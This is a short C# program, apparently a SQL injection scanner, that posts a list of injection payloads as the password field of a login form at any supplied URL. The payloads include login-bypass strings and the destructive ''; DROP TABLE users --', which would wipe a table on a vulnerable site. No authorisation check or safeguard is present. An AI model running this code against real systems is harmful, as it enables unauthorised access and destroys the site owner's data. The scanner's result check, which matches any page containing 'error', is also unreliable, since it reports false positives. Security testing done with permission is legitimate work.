using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;

public class SqlInjectionScanner
{
    private string targetUrl;

    public SqlInjectionScanner(string url)
    {
        targetUrl = url;
    }

    public async Task TestSqlInjection()
    {
        string[] sqlInjectionPayloads = new string[]
        {
            "' OR 1=1 --",
            "' OR '1'='1' --",
            "admin' --",
            "' OR 1=1#",
            "'; DROP TABLE users --"
        };

        foreach (var payload in sqlInjectionPayloads)
        {
            Console.WriteLine($"[+] Testing payload: {payload}");

            var formData = new Dictionary<string, string>
            {
                { "username", "admin" },
                { "password", payload }
            };

            var response = await SendHttpRequest(targetUrl, formData);
            AnalyzeResponse(response);
        }
    }

    private async Task<string> SendHttpRequest(string url, Dictionary<string, string> formData)
    {
        using (HttpClient client = new HttpClient())
        {
            var content = new FormUrlEncodedContent(formData);
            HttpResponseMessage response = await client.PostAsync(url, content);
            return await response.Content.ReadAsStringAsync();
        }
    }

    private void AnalyzeResponse(string response)
    {
        if (response.Contains("SQL syntax") || response.Contains("error"))
        {
            Console.WriteLine("[!] SQL Injection vulnerability detected!");
        }
        else
        {
            Console.WriteLine("[+] No SQL Injection vulnerability found.");
        }
    }
}
